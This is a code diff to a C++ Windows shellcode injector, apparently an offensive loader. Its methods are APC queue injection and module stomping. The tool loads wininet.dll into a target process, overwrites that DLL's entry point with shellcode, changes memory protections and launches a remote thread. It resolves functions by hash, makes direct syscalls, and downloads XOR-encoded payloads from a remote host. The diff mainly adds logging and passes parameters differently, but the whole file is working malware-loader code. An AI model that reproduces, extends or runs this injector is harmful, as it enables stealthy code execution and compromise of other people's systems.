@@ -72,11 +72,11 @@ VOID threadHijacking(HANDLE hProcess, LPVOID rBuffer, DWORD process_id) {
 
 
 
-void apcQueueInjection(int pid) {
+void apcQueueInjection(int pid, SIZE_T shellcode_len, unsigned char* shellcode) {
     hProcess = mainInjector.process(pid);
     rBuffer = mainInjector.vAlloc(hProcess, addr, shellcode_len);
     mainInjector.wrMem(hProcess, rBuffer, shellcode, shellcode_len);
-    BOOL ok = mainInjector.protectMem(hProcess, rBuffer);
+    BOOL ok = mainInjector.protectMem(hProcess, rBuffer, shellcode_len);
     std::cout << "thread hijacking !!";
 
      
@@ -87,8 +87,10 @@ void apcQueueInjection(int pid) {
 }
 
 
-void moduleStomping(int pid) {
-	
+void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
+    std::cout << "-------In moduleStomping function-------\n";
+
+	std::cout << "Going to inject shellcode, shellcode is : " << shellcode << "specified shellcode_len param is : " << shellcode_len << "\n";
     wchar_t moduleToInject[] = L"C:\\windows\\system32\\wininet.dll";
     HMODULE modules[256] = {};
     SIZE_T modulesSize = sizeof(modules);
@@ -98,7 +100,7 @@ void moduleStomping(int pid) {
     CHAR remoteModuleName[128] = {};
     HMODULE remoteModule = NULL;
 
-    hProcess = mainInjector.process(process_id);
+    hProcess = mainInjector.process(pid);
 	std::cout << "Handle for pid " << pid << ": " << hProcess << "\n";
     rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
     //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
@@ -114,25 +116,28 @@ void moduleStomping(int pid) {
     
 
     PVOID pLoadLibraryW = syscallHandler.getFunctionAddressByHash(wK, 1606414609);
-
+	std::cout << "LoadLibraryW address: " << pLoadLibraryW << "\n";
     // 3. Cast it to the function pointer type for use in CreateRemoteThread or ntThread
     PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)pLoadLibraryW;
     //ntThread(hProcess, rBuffer);
+	std::cout << "Injecting DLL C:\\windows\\system32\\wininet.dll in handle " << hProcess << "at the startAdress of " << threadRoutine << " \n";
     HANDLE dllThread = mainInjector.ntThread(hProcess, threadRoutine, rBuffer);
     mainInjector.waitForSingle(dllThread);
 
 	
-    // find base address of the injected benign DLL in remote process
+    std::cout << "[...]  finding base address of the injected DLL in remote process" << std::endl;
     remoteModule = (HMODULE)mainInjector.findRemoteModule(hProcess, L"wininet.dll");
-    
+    std::cout << "[+]  found base address of the injected wininet.dll in remote process, HMODULE: " << remoteModule << std::endl;
     // get DLL's AddressOfEntryPoint
     DWORD headerBufferSize = 0x1000;
     std::cout << "allocating heap" << "\n";
+	std::cout << "aloocating some space for the DLL headers in the local process to read the headers from the remote process" << "\n";
     PVOID targetProcessHeaderBuffer = mainInjector.vAlloc(
         (HANDLE)-1,           // (HANDLE)-1 is a pseudo-handle for the current process
         NULL,                 // Let the OS pick the address
         headerBufferSize      // 4KB is enough for PE headers
     );
+	std::cout << "allocated local buffer at: " << targetProcessHeaderBuffer << " to read remote DLL headers\n";
     sysNtReadVirtualMemory(hProcess, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
 
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
@@ -140,93 +145,47 @@ void moduleStomping(int pid) {
     PVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
     std::cout << ", entryPoint at " << dllEntryPoint;
     SIZE_T bytesWritten = 0;
-    SIZE_T len_shellcode = shellcode_len;
+    
 	DWORD oldProtect = 0;
 	SIZE_T size = 0x4000;
-	
-    NTSTATUS rwxStatus = mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_READWRITE);
+	std::cout << "changing permissions to rw for the entry point of the injected DLL in the remote process before sending it\n";
+    NTSTATUS rwxStatus = mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_READWRITE, shellcode_len);
    
 	std::cout << "\nstatus after changing permissions to rwx: " << rwxStatus << "\n";
-    NTSTATUS status = mainInjector.wrMem(hProcess, dllEntryPoint, (LPVOID)shellcode, len_shellcode);
+	std::cout << "writing shellcode to the entry point of the injected DLL in the remote process\n";
+    NTSTATUS status = mainInjector.wrMem(hProcess, dllEntryPoint, (LPVOID)shellcode, shellcode_len);
 	std::cout << "\nstatus after writing shellcode to dllentryPoint: " << status << "\n";
-    mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_EXECUTE_READ);
+	std::cout << "changing permissions to rx for the entry point of the injected DLL in the remote process\n";
+    mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_EXECUTE_READ, shellcode_len);
     //sysNtProtectVirtualMemory(hProcess, &dllEntryPoint, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
     // execute shellcode from inside the benign DLL
+	std::cout << "creating remote thread at the entry point of the injected DLL in the remote process to execute our shellcode\n";
 	mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL);
     
 
 }
 
-void printHelp(const char* programName) {
-    std::cout <<
-        "Usage:\n"
-        << programName << " --pid <pid> --method <apc|stomp> [options]\n\n"
-        "Options:\n"
-        "  --pid <int>            Target process id\n"
-        "  --method <string>      apc | stomp\n"
-        "  --key <hex>            XOR key (default 0x67)\n"
-        "  --remote <url>         Remote host (https://site.com)\n"
-        "  --file <path>          Remote file (/payload.bin)\n"
-        "  --help                 Show this help\n";
-}
 
-struct Options {
-    int pid = 0;
-    std::string method;
-    bool useRemote = false;
-
-    std::wstring url;
-    std::wstring file;
-
-    unsigned char key = 0x67;
-};
-Options parseArgs(int argc, char* argv[]) {
-    Options opt;
-
-    for (int i = 1; i < argc; i++) {
-        std::string arg = argv[i];
-
-        if (arg == "--help") {
-            printHelp(argv[0]);
-            exit(0);
-        }
-
-        else if (arg == "--pid" && i + 1 < argc) {
-            opt.pid = std::stoi(argv[++i]);
-        }
-
-        else if (arg == "--method" && i + 1 < argc) {
-            opt.method = argv[++i];
-        }
-
-        else if (arg == "--key" && i + 1 < argc) {
-            opt.key = static_cast<unsigned char>(std::stoi(argv[++i], nullptr, 0));
-        }
-
-        else if (arg == "--remote" && i + 1 < argc) {
-            opt.useRemote = true;
-            std::string tmp = argv[++i];
-            opt.url = std::wstring(tmp.begin(), tmp.end());
-        }
-
-        else if (arg == "--file" && i + 1 < argc) {
-            std::string tmp = argv[++i];
-            opt.file = std::wstring(tmp.begin(), tmp.end());
-        }
+void print(std::string message, unsigned char* value, int flag) {
+    if (flag == 0) {
+        std::cout << "[+]" << message << value << std::endl;
     }
-
-    return opt;
+    if(flag == 1) {
+        std::cout << "[-]" << message << value << std::endl;
+	}
+    if(flag == 2) {
+        std::cout << "[!!]" << message << value << std::endl;
+	}
+	
 }
-
-
 int main(int argc, char* argv[]) {
-
+    
     
 
-    Options opt = parseArgs(argc, argv);
-
+    helper::Options opt = helperHandler.parseArgs(argc, argv);
+	std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
     if (opt.pid == 0 || opt.method.empty()) {
-        printHelp(argv[0]);
+        helperHandler.printHelp(argv[0]);
         return 1;
     }
 
@@ -236,39 +195,42 @@ int main(int argc, char* argv[]) {
     }
 
     std::vector<unsigned char> shellcode_vector;
-
+	std::cout << "Init shellcode_vector\n";
     if (opt.useRemote) {
         if (opt.url.empty() || opt.file.empty()) {
             std::cout << "Missing remote url/file\n";
             return 1;
         }
-
+		
         shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
             opt.url,
             opt.file,
             opt.key
         );
+        std::cout << "Downloaded bytes: " << shellcode_vector.size() << "\n";
+        std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
     }
-    if(!shellcode_vector.empty()) {
-        
-        helperHandler.xor_shellcode(shellcode_vector.data(), shellcode_vector.size(), opt.key);
-	}
-    else {
-        unsigned char shellcode_key = 0x67;
+    
+    //else {
+        //unsigned char shellcode_key = 0x67;
 
 
-        helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);
-    }
+        //helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);
+    //}
 	std::cout << "pid: " << opt.pid << "\n";
     
 
-    
+	process_id = opt.pid;
 
     if (opt.method == "apc") {
-        apcQueueInjection(opt.pid);
+        apcQueueInjection(process_id, shellcode_vector.size(), shellcode_vector.data());
     }
     else if (opt.method == "stomp") {
-        moduleStomping(opt.pid);
+        
+
+        moduleStomping(process_id,
+            shellcode_vector.data(),
+            shellcode_vector.size());
     }
 
     return 0;
